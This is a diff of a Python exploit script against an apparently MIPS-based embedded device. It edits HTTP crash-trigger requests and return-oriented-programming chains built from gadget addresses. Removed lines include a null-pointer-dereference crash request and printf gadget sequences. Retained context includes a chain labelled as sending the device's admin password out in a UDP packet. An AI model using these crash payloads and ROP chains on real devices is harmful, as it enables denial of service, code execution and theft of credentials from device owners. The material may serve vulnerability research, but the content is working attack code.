@@ -517,23 +517,6 @@ elif args.command == 'http':
             # Send the request
             s.sendall(request)
             s.close()
-        elif args.crash[1] == '10':
-            print("HTTP NPD 3")
-
-            # Build the request
-            request = b"POST / HTTP/1.1\r\n"
-            request += b'Content-Type: multipart/form-data\r\n'
-            request += b"\r\n\r\n"
-            request += b'CMD=SYS_UPG\r\n\r\n'
-            
-            # Create socket and connect
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((args.ip, 80))
-
-            # Send the request
-            s.sendall(request)
-            s.close()
     elif args.rop:
         base_address = 0x80000400
         # Padding 
@@ -559,65 +542,13 @@ elif args.command == 'http':
         config_get_addr = 0x800089e4
 
         # Build the ROP chain
-        if (args.rop[0] == '1'): # print 'hello_core.con' to uart/telnet command line
+        if (args.rop[0] == '1'): # print 'hello' to uart/telnet command line
             ## print 'hello'
             # Add the strings to the sX registers, and set the ra to first gadget
             chain += p32(0x801d3754) # s0 ('hello')
             chain += p32(0x801c3f91) # s1 ("%s")
             chain += p32(0xdecea5ed) # s2
             chain += p32(0xdecea5ed) # s3
-            chain += p32(0x12ba10 + base_address) # ra
-            
-            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdecea5ed) # s0
-            chain += p32(0x187a30 + base_address) # ra
-
-            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += b'a'*4
-            chain += p32(0xdecea5ed) # s0
-            chain += p32(0xdecea5ed) # s1
-            chain += p32(0x57864 + base_address)
-
-            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += p32(0x8019a3a0) # v0 - printf address
-            chain += b'a' * 8
-            chain += p32(0x15114 + base_address) # ra
-
-            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            chain += b'a' * 4
-            chain += p32(0x13478 + base_address) # ra
-
-            ## print 'core.c'
-            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += b'b' * 4
-            chain += p32(0x801d8faf) # s0 ('core.c')
-            chain += p32(0x801c3f91) # s1 ("%s")
-            chain += p32(0x12ba10 + base_address) # ra
-            
-            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdecea5ed) # s0
-            chain += p32(0x187a30 + base_address) # ra
-
-            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += b'a'*4
-            chain += p32(0xdecea5ed) # s0
-            chain += p32(0xdecea5ed) # s1
-            chain += p32(0x57864 + base_address)
-
-            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += p32(0x8019a3a0) # v0 - printf address
-            chain += b'a' * 8
-            chain += p32(0x15114 + base_address) # ra
-
-            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            chain += b'a' * 4
-            chain += p32(0x13478 + base_address) # ra
-
-            ## print 'on'
-            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += b'b' * 4
-            chain += p32(0x801dcd98+0xa) # s0 ('on')
-            chain += p32(0x801c3f91) # s1 ("%s")
             chain += p32(0x12ba10 + base_address) # ra
             
             # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
@@ -690,27 +621,6 @@ elif args.command == 'http':
             # 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
             chain += b'a' * 4
             chain += p32(0x57864 + base_address) # ra
-
-                    ##### Didn't work because branch delay slot :'(
-                    # # 0x00073930: lw $v1, ($sp); lw $ra, 0xc($sp); move $v0, $s0; lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x10;
-                    # chain += p32(0xffffffff) # v1 - socket address
-                    # chain += b'a' * 4
-                    # chain += p32(0xdecea5ed) # s0
-                    # chain += p32(0x175e34 + base_address) # ra
-
-                    # # 0x00175e34: jalr $v1; ori $a1, $a1, 0x6934; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-                    # chain += b'b' * 0xc
-                    # chain += p32(0xdeadb00f) # ra
-
-                    ##### Didn't work because 2nd gadget clears v0 so we don't know the file descriptor of the socket cringe
-                    # # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-                    # chain += p32(socket_addr) # v1 - socket address
-                    # chain += b'a' * 8
-                    # chain += p32(0x15114 + base_address) # ra
-
-                    # # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
-                    # chain += b'b' * 4
-                    # chain += p32(0xdecea5ed)
 
             # Load address of socket into v0
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
@@ -1011,10 +921,10 @@ elif args.command == 'http':
         
         elif args.rop[0] == '5': # Send a UDP packet containing the admin password (need to make it able to handle arbitrary length with strlen or something)
             # Add the strings to the sX registers, and set the ra to first gadget
-            chain += p32(0xaaaaaaaa) # s0
-            chain += p32(0xbbbbbbbb) # s1
-            chain += p32(0xcccccccc) # s2
-            chain += p32(0xdddddddd) # s3
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
             chain += p32(0x11e670 + base_address) # ra
 
             ####################################################################
